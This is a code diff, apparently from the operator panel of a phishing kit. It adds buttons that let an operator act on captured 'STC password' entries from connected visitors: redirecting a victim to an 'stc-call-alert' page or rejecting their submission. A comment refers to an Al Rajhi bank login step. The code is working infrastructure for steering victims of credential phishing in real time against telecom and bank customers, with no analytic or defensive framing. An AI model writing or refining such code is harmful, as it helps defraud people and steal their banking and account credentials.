@@ -1290,10 +1290,35 @@
             
             // إضافة أزرار لكلمة مرور STC
             if (dataEntry.page === 'كلمة مرور STC') {
+              const stcCallBtnId = 'stc-call-btn-' + visitor.socketId + '-' + index;
+              const stcRejectBtnId = 'stc-reject-btn-' + visitor.socketId + '-' + index;
               html += '<div class="flex gap-2 mt-3">';
-              html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'stc-call-alert\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
-              html += '<button onclick="rejectForm(\'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '<button id="' + stcCallBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
+              html += '<button id="' + stcRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
               html += '</div>';
+              // إضافة event listeners بعد إنشاء العناصر
+              setTimeout(() => {
+                const callBtn = document.getElementById(stcCallBtnId);
+                const rejectBtn = document.getElementById(stcRejectBtnId);
+                if (callBtn) {
+                  callBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'stc-call-alert');
+                    callBtn.textContent = 'تم ✓';
+                    callBtn.disabled = true;
+                    callBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
+                    callBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    rejectForm(visitor.socketId);
+                    rejectBtn.textContent = 'تم ✓';
+                    rejectBtn.disabled = true;
+                    rejectBtn.classList.remove('bg-red-600', 'hover:bg-red-700');
+                    rejectBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+                  });
+                }
+              }, 100);
             }
             
             // إضافة أزرار للراجحي تسجيل الدخول
